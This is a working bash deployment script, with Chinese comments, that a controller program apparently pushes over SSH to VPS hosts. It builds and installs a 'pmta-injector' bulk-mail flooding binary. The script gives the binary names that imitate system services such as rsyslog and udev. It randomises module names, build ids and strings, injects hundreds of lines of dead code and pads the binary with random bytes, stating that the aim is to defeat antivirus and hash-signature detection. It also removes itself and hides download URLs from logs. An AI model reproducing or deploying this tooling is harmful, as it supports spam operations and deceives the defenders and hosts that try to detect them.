#!/bin/bash
# =============================================================================
# hrkdeploy-go.sh - pmta-injector (GO) 注入程序 VPS 现场编译部署脚本
# =============================================================================
# 来源: Haraka.exe 内嵌，SSH 上传到 /tmp/hrkdeploy-<uuid>.sh 后执行，执行完即删
#
# 用途: 在 VPS 上下载 Go + pmta-injector 源码 tar.gz，替换变体占位符，编译成
#       伪装文件名的二进制（如 rsyslog-66a / udev-ag-db4），供 Haraka.exe 灌信
#
# 调用方: Haraka.exe (C#) 通过 SSH 注入以下环境变量后执行本脚本
#
# 脚本结构:
#   0  pre-flight        环境预检 (root/Linux/x86_64/磁盘)
#   1  ensure deps       安装 curl/unzip/python3 等
#   2  swap              内存不足时创建临时 2G swap
#   3  download go       下载 Go 1.22.3 工具链
#   4  download source   下载 pmta-injector.tar.gz
#   5  mutate placeholders  变体混淆（模块名/版本/fatcode/消息字符串）
#   6  compile           go build 生成二进制
#   7  tail padding      随机尾部填充（改变 sha256 指纹）
#   8  self-check        编译产物 --help 自检
#   9  install           安装到 VAR_INSTALL_DIR 并输出 DEPLOY_OK
#
# 退出码:
#   0  = 成功 (最后一行 DEPLOY_OK:路径:sha256)
#   10 = 预检或依赖安装失败
#   11 = Go 工具链下载/校验失败
#   12 = 源码 tar.gz 下载/校验失败
#   13 = 编译或占位符替换失败
#   14 = 自检失败（二进制无法运行）
# =============================================================================
set -e

# 日志/失败辅助函数（输出格式与 Haraka.exe 日志解析一致）
log()  { echo "[$(date -u +%H:%M:%S)] $*"; }
fail() { echo "ERROR: $*" >&2; exit "${2:-1}"; }
# ============================================================================
# download_with_fallback: 健壮下载函数
#   策略: 先用 HTTP/2 尝试 3 次 (每次间隔 3 秒), 失败后降级 HTTP/1.1 再尝试 3 次
#   设计目的: 彻底规避 HTTP/2 协议层的瞬时错误 (curl 92 INTERNAL_ERROR 等),
#             同时保留 HTTP/2 在正常情况下的性能优势
#
# 参数:
#   $1 = 输出文件路径 (相对或绝对)
#   $2 = 下载 URL
# 返回:
#   0 = 下载成功 (且 SHA256 等后续校验由调用方负责)
#   1 = 全部尝试失败
#
# 超时控制:
#   --connect-timeout 15  建立 TCP/TLS 连接限 15 秒
#   --max-time 180        整个下载限 180 秒 (66MB Go 工具链在 500KB/s 的下行也能完成)
#
# 注意:
#   curl 不用 --retry 系列参数, 因为我们需要手动控制 HTTP/2 → HTTP/1.1 的切换,
#   手写循环比依赖 curl 内部重试更可控、日志更清晰。
# ============================================================================
download_with_fallback() {
    local out="$1"
    local url="$2"
    local mode attempt curl_flag rc

    # 最坏情况: 6 次 curl 调用, 最多 5 次 sleep(3), 总用时约 2.5 分钟
    for mode in "http2" "http1.1"; do
        curl_flag=""
        [ "$mode" = "http1.1" ] && curl_flag="--http1.1"

        for attempt in 1 2 3; do
            log "  download attempt [$mode] $attempt/3"
            # 注意: 这里的 $curl_flag 必须不加引号, 因为在 http2 模式下它是空字符串,
            # 加引号会变成一个空参数传给 curl 导致错误。
            # 不使用 `if curl ...; then` 结构, 因为这样 $? 会被后续命令覆盖, 无法准确记录 curl 退出码
            # 改用 set +e 手动捕获 curl 的返回码, 记录完毕后 set -e 恢复严格模式
            set +e
            # 【Haraka21】2>/dev/null 避免 curl 自己的错误文本（可能含 URL）泄露到日志
            curl -fsSL $curl_flag --connect-timeout 15 --max-time 180 -o "$out" "$url" 2>/dev/null
            rc=$?
            set -e
            if [ $rc -eq 0 ]; then
                log "  download success [$mode] attempt $attempt"
                return 0
            fi
            log "  download failed [$mode] attempt $attempt (curl exit $rc)"
            # 除了本模式最后一次之外, 都 sleep 3 秒再试
            if [ $attempt -lt 3 ]; then
                sleep 3
            fi
        done

        # 一种模式用完了, 如果还是 http2 阶段, 提示即将降级
        if [ "$mode" = "http2" ]; then
            log "  http2 exhausted after 3 attempts, falling back to http1.1"
            sleep 3
        fi
    done

    log "  all download attempts exhausted (http2 x3 + http1.1 x3)"
    return 1
}

# ===== 必填环境变量（Haraka.exe 在 bash 前 export）=====
# VAR_INSTALL_DIR   安装目录，必须在 /opt 下，如 /opt/kmon-fadf95
# VAR_BINARY_NAME   伪装二进制名，如 rsyslog-66a
# VAR_TASKS_BASE_DIR 任务目录，如 .../tasks（Haraka.exe 灌信时写 config.yaml）
# VAR_MODULE_NAME   Go module 随机名，如 1czpdumq-kcoddj/core（每台机器不同）
# VAR_VERSION       随机版本号字符串，写入 main.Version
# VAR_BUILDID       随机 build id，写入 -ldflags -buildid
# VAR_GITCOMMIT     随机 git commit hash，写入 main.GitCommit
# SRC_TAR_URL       源码 tar.gz 地址（pmta-injector.tar.gz，内含 go.mod + main.go）
# SRC_TAR_SHA256    源码 tar.gz 校验和（固定，防篡改）
# 兼容旧变量名 SRC_ZIP_URL / SRC_ZIP_SHA256（仍指向 tar.gz）
: "${VAR_INSTALL_DIR:?missing VAR_INSTALL_DIR}"
: "${VAR_BINARY_NAME:?missing VAR_BINARY_NAME}"
: "${VAR_TASKS_BASE_DIR:?missing VAR_TASKS_BASE_DIR}"
: "${VAR_MODULE_NAME:?missing VAR_MODULE_NAME}"
: "${VAR_VERSION:?missing VAR_VERSION}"
: "${VAR_BUILDID:?missing VAR_BUILDID}"
: "${VAR_GITCOMMIT:?missing VAR_GITCOMMIT}"
SRC_TAR_URL="${SRC_TAR_URL:-${SRC_ZIP_URL:-}}"
SRC_TAR_SHA256="${SRC_TAR_SHA256:-${SRC_ZIP_SHA256:-}}"
: "${SRC_TAR_SHA256:?missing SRC_TAR_SHA256}"
if [ -z "${SRC_TAR_PRELOADED:-}" ]; then
    : "${SRC_TAR_URL:?missing SRC_TAR_URL (or set SRC_TAR_PRELOADED)}"
fi

case "$VAR_INSTALL_DIR" in
    /opt/*) ;;
    *) fail "VAR_INSTALL_DIR must be under /opt (got: $VAR_INSTALL_DIR)" 10 ;;
esac
case "$VAR_TASKS_BASE_DIR" in
    /opt/*) ;;
    *) fail "VAR_TASKS_BASE_DIR must be under /opt (got: $VAR_TASKS_BASE_DIR)" 10 ;;
esac

# Go 工具链版本与 sha256（可覆盖，默认 1.22.3 linux-amd64）
GO_VERSION="${GO_VERSION:-1.22.3}"
GO_SHA256="${GO_SHA256:-8920ea521bad8f6b7bc377b4824982e011c19af27df88a815e3586ea895f1b36}"

# ===== 临时工作目录 + 退出时自动清理 =====
# WORK_DIR: /tmp/hrkdeploy-XXXXXXXX，存放 go 工具链、源码、编译产物
# trap: 无论成功失败都删除 WORK_DIR 和本脚本创建的临时 swap
WORK_DIR="$(mktemp -d /tmp/hrkdeploy-XXXXXXXX)"
SWAP_CREATED_BY_US=0

cleanup() {
    local rc=$?
    set +e
    [ -n "$WORK_DIR" ] && [ -d "$WORK_DIR" ] && rm -rf "$WORK_DIR"
    if [ "$SWAP_CREATED_BY_US" = "1" ] && [ -f /tmp/hrkdeploy.swap ]; then
        swapoff /tmp/hrkdeploy.swap 2>/dev/null
        rm -f /tmp/hrkdeploy.swap
    fi
    exit $rc
}
trap cleanup EXIT INT TERM

# ===== Step 0: 环境预检 =====
# 用途: 确保 root、Linux x86_64、根分区至少 2GB 可用空间
log "pre-flight check"
[ "$(id -u)" = "0" ] || fail "must run as root" 10
[ "$(uname -s)" = "Linux" ] || fail "not linux" 10
[ "$(uname -m)" = "x86_64" ] || fail "not x86_64" 10
AVAIL_GB=$(df -BG --output=avail / | tail -1 | tr -dc 0-9)
[ "${AVAIL_GB:-0}" -ge 2 ] || fail "disk < 2GB free" 10

# ===== Step 1: 安装基础依赖 =====
# 用途: 编译/下载所需命令；缺失时 apt 静默安装
NEED=()
for c in curl tar python3 sed grep awk; do
    command -v "$c" >/dev/null 2>&1 || NEED+=("$c")
done
if [ ${#NEED[@]} -gt 0 ]; then
    log "installing: ${NEED[*]}"
    apt-get update -qq >/dev/null 2>&1 || true
    DEBIAN_FRONTEND=noninteractive apt-get install -y -qq "${NEED[@]}" >/dev/null 2>&1 \
        || fail "apt install failed: ${NEED[*]}" 10
fi

# ===== Step 2: 按需创建临时 swap =====
# 用途: 物理内存 < 3GB 且现有 swap < 500MB 时，创建 2G 临时 swap 防止 go build OOM
TOTAL_MB=$(free -m | awk '/^Mem:/{print $2}')
CUR_SWAP_MB=$(free -m | awk '/^Swap:/{print $2}')
if [ "${TOTAL_MB:-0}" -lt 3000 ] && [ "${CUR_SWAP_MB:-0}" -lt 500 ]; then
    log "creating temp 2G swap"
    fallocate -l 2G /tmp/hrkdeploy.swap 2>/dev/null \
        || dd if=/dev/zero of=/tmp/hrkdeploy.swap bs=1M count=2048 status=none
    chmod 600 /tmp/hrkdeploy.swap
    mkswap /tmp/hrkdeploy.swap >/dev/null 2>&1
    swapon /tmp/hrkdeploy.swap && SWAP_CREATED_BY_US=1
fi

# ===== Step 3: 下载并解压 Go 工具链 =====
# 用途: 在 VPS 现场编译，不依赖系统预装 go；主源 go.dev，备源 GCS
# 主源: go.dev (Google + Fastly 全球 CDN, 通常最快)# 备源: storage.googleapis.com/golang (GCS 直连, 无 edge cache 但非常稳定)
# 两个 URL 指向完全相同的文件, SHA256 一致, 任一下载成功后校验逻辑不变。
# 最坏情况: 主源 6 次 + 备源 6 次 = 12 次尝试, 约 5 分钟 (仍在 SSH 900 秒超时内)。
log "download go $GO_VERSION"
cd "$WORK_DIR"

GO_PRIMARY_URL="https://go.dev/dl/go${GO_VERSION}.linux-amd64.tar.gz"
GO_FALLBACK_URL="https://storage.googleapis.com/golang/go${GO_VERSION}.linux-amd64.tar.gz"

if ! download_with_fallback go.tar.gz "$GO_PRIMARY_URL"; then
    log "go.dev primary source failed, trying Google Cloud Storage fallback"
    download_with_fallback go.tar.gz "$GO_FALLBACK_URL" \
        || fail "go download failed (all sources exhausted)" 11
fi

echo "$GO_SHA256  go.tar.gz" | sha256sum -c --quiet \
    || fail "go sha256 mismatch" 11
tar -xzf go.tar.gz || fail "go extract failed" 11
rm -f go.tar.gz
export PATH="$WORK_DIR/go/bin:$PATH"
export GOROOT="$WORK_DIR/go"
export GOCACHE="$WORK_DIR/gocache"
export GOMODCACHE="$WORK_DIR/gomodcache"
# GOFLAGS 在解压源码后按是否存在 vendor/ 再决定（clean 带 vendor，goMail 现场拉模块）

# ===== Step 4: 下载 pmta-injector 源码 tar.gz =====
log "download source"
if [ -n "${SRC_TAR_PRELOADED:-}" ] && [ -f "$SRC_TAR_PRELOADED" ]; then
    log "use preloaded source: $SRC_TAR_PRELOADED"
    cp "$SRC_TAR_PRELOADED" src.tar.gz \
        || fail "copy preloaded source failed" 12
else
    download_with_fallback src.tar.gz "$SRC_TAR_URL" \
        || fail "source download failed" 12
fi
echo "$SRC_TAR_SHA256  src.tar.gz" | sha256sum -c --quiet \
    || fail "source sha256 mismatch" 12
tar -xzf src.tar.gz || fail "source extract failed" 12
rm -f src.tar.gz

# 解析源码目录：兼容 pmta-injector-clean/、pmta-injector/、或解压到当前目录。
# 必须跳过 Step 3 解压出的 Go 工具链目录 ./go
resolve_src_dir() {
    if [ -f ./go.mod ] && [ -f ./main.go ]; then
        echo "."
        return 0
    fi
    local d
    for d in ./*/; do
        d="${d%/}"
        [ -d "$d" ] || continue
        [ "$d" = "./go" ] || [ "$d" = "go" ] && continue
        if [ -f "$d/go.mod" ] && [ -f "$d/main.go" ]; then
            echo "$d"
            return 0
        fi
        # 兼容 tar 多包一层（如 pmta-injector/pmta-injector-clean/）
        local inner
        for inner in "$d"/*/; do
            inner="${inner%/}"
            [ -d "$inner" ] || continue
            if [ -f "$inner/go.mod" ] && [ -f "$inner/main.go" ]; then
                echo "$inner"
                return 0
            fi
        done
    done
    return 1
}
SRC_DIR="$(resolve_src_dir)" || {
    log "extract listing:"
    ls -la >&2 || true
    fail "source dir not found after extract (tar must contain go.mod + main.go)" 12
}
log "source dir: $SRC_DIR"
cd "$SRC_DIR"

# ===== Step 5: 变体占位符替换 + 二进制混淆 =====
# 用途: 每台 VPS 生成唯一 module 名/版本/buildid，并注入随机 dead code，
#       使编译产物 sha256 与文件名均不同，降低批量特征识别
log "apply variant placeholders"
# 5.1 替换 Go module 路径（__MODULE_PLACEHOLDER__ → 随机 module/core）
sed -i "s|__MODULE_PLACEHOLDER__|${VAR_MODULE_NAME}|g" go.mod
find . -name "*.go" -not -path "./vendor/*" -exec \
    sed -i "s|__MODULE_PLACEHOLDER__|${VAR_MODULE_NAME}|g" {} +
# 5.2 写入版本/build 元数据到 main.go
sed -i "s|__VERSION_PLACEHOLDER__|${VAR_VERSION}|g" main.go
sed -i "s|__BUILDTIME_PLACEHOLDER__|$(date -u +%s)|g" main.go
sed -i "s|__GITCOMMIT_PLACEHOLDER__|${VAR_GITCOMMIT}|g" main.go

# 5.3 fatcode.go 随机 marker（反病毒/哈希特征混淆）
FATCODE_MARKER="$(tr -dc 'a-zA-Z0-9' </dev/urandom | head -c32)"
sed -i "s|__FATCODE_MARKER_PLACEHOLDER__|${FATCODE_MARKER}|g" fatcode.go

# 5.4 messages.go: 将 __MSG_NNN__ 替换为等长随机字符串（保持编译通过）
SEED=$(od -An -N4 -tu4 < /dev/urandom | tr -d ' ')
cat > "$WORK_DIR/msgrepl.py" <<'PYEOF'
import re, random, string, sys
random.seed(int(sys.argv[1]))
with open('messages.go') as f: c = f.read()
def r(m):
    return ''.join(random.choices(string.ascii_letters+string.digits, k=len(m.group(0))))
c = re.sub(r'__MSG_\d{3}__', r, c)
open('messages.go','w').write(c)
PYEOF
python3 "$WORK_DIR/msgrepl.py" "$SEED" || fail "messages.go mutation failed" 13

# 5.5 追加 200~400 行随机 dead code 到 fatcode.go（进一步改变二进制指纹）
FATCODE_LINES=$(( 200 + (RANDOM % 200) ))
cat > "$WORK_DIR/fatgen.py" <<'PYEOF'
import random, sys, string
random.seed(int(sys.argv[1]) + 7919)
n = int(sys.argv[2])
lines = ['', '// auto-generated dead code', '']
for i in range(n):
    fn = '_fn_' + ''.join(random.choices('abcdefghijklmnop', k=10))
    v  = '_v_'  + ''.join(random.choices('abcdefghij', k=8))
    lines.append('func ' + fn + '() int {')
    lines.append('    ' + v + ' := ' + str(random.randint(1,9999)))
    for _ in range(random.randint(3,12)):
        op = random.choice(['+','-','*','^','|','&'])
        lines.append('    ' + v + ' = ' + v + ' ' + op + ' ' + str(random.randint(1,500)))
    lines.append('    return ' + v)
    lines.append('}')
with open('fatcode.go','a') as f:
    f.write('\n'.join(lines))
PYEOF
python3 "$WORK_DIR/fatgen.py" "$SEED" "$FATCODE_LINES" || fail "fatcode generation failed" 13

# sanity format-check (non-fatal; gofmt -l only lists, does not fail build)
"$WORK_DIR/go/bin/gofmt" -l fatcode.go messages.go >/dev/null 2>&1 || true

# vendor 只含第三方依赖，不含主模块；占位符只改项目 .go，vendor 可离线编译。
# pmta-injector-clean 打包带 vendor；goMail 通常不带，现场 download。
if [ -d vendor ] && [ -f vendor/modules.txt ]; then
    log "use vendored modules"
    export GOFLAGS="-mod=vendor"
else
    log "download go modules"
    export GOPROXY="${GOPROXY:-https://proxy.golang.org,direct}"
    export GOFLAGS="-mod=mod"
    if ! go mod download 2>&1; then
        log "go.sum mismatch, drop go.sum and retry"
        rm -f go.sum
        GOSUMDB=off go mod download 2>&1 || fail "go mod download failed" 13
    fi
fi

# ===== Step 6: 编译 =====
# 用途: 静态链接 go build；-s -w 去符号表；随机 inline level 增加二进制差异
log "compile"
INLINE_LEVEL=$(( RANDOM % 3 ))
go build \
    -trimpath \
    -buildvcs=false \
    -ldflags="-s -w -buildid=${VAR_BUILDID} -X main.Version=${VAR_VERSION} -X main.BuildTime=$(date -u +%s) -X main.GitCommit=${VAR_GITCOMMIT}" \
    -gcflags="all=-l=${INLINE_LEVEL}" \
    -o "$WORK_DIR/outbin" \
    . 2>&1 || fail "go build failed" 13
[ -f "$WORK_DIR/outbin" ] || fail "binary not produced" 13

# ===== Step 7: 二进制尾部随机填充 =====
# 用途: 在 ELF 末尾追加 256~768 字节随机数据，使每台机器 BinarySha256 唯一
PAD=$(( 256 + (RANDOM % 512) ))
dd if=/dev/urandom bs=1 count="$PAD" >> "$WORK_DIR/outbin" 2>/dev/null

# ===== Step 8: 编译产物自检 =====
# 用途: 确认二进制可执行且 --help 正常（Haraka.exe 部署前最后一道编译侧检查）
chmod 0755 "$WORK_DIR/outbin"
if ! "$WORK_DIR/outbin" --help >/dev/null 2>&1; then
    fail "self-check --help failed" 14
fi

# ===== Step 9: 安装到目标路径 =====
# 用途: 写入 VAR_INSTALL_DIR/VAR_BINARY_NAME，创建 tasks 目录，输出 DEPLOY_OK 供 Haraka.exe 解析
log "install to $VAR_INSTALL_DIR/$VAR_BINARY_NAME"
mkdir -p "$VAR_INSTALL_DIR"
mkdir -p "$VAR_TASKS_BASE_DIR"
chmod 0755 "$VAR_INSTALL_DIR" "$VAR_TASKS_BASE_DIR"

# 若目标路径已有旧二进制，先备份为 .old 再覆盖（失败不影响继续）
if [ -f "$VAR_INSTALL_DIR/$VAR_BINARY_NAME" ]; then
    mv -f "$VAR_INSTALL_DIR/$VAR_BINARY_NAME" \
          "$VAR_INSTALL_DIR/$VAR_BINARY_NAME.old" 2>/dev/null || true
fi
install -m 0755 "$WORK_DIR/outbin" "$VAR_INSTALL_DIR/$VAR_BINARY_NAME"
chown root:root "$VAR_INSTALL_DIR/$VAR_BINARY_NAME" 2>/dev/null || true
rm -f "$VAR_INSTALL_DIR/$VAR_BINARY_NAME.old" 2>/dev/null || true

# 安装后再次 --help 自检，确认 install 未损坏可执行权限
"$VAR_INSTALL_DIR/$VAR_BINARY_NAME" --help >/dev/null 2>&1 \
    || fail "installed binary self-check failed" 14

FINAL_SHA=$(sha256sum "$VAR_INSTALL_DIR/$VAR_BINARY_NAME" | awk '{print $1}')

printf '%s\n' "$SRC_TAR_SHA256" > "$VAR_INSTALL_DIR/.source_tar_sha256"
chmod 0644 "$VAR_INSTALL_DIR/.source_tar_sha256"

# 机器可读成功标记（Haraka.exe 解析最后一行，写入 config.json InjectorVariant.BinarySha256）
echo "DEPLOY_OK:${VAR_INSTALL_DIR}/${VAR_BINARY_NAME}:${FINAL_SHA}"
exit 0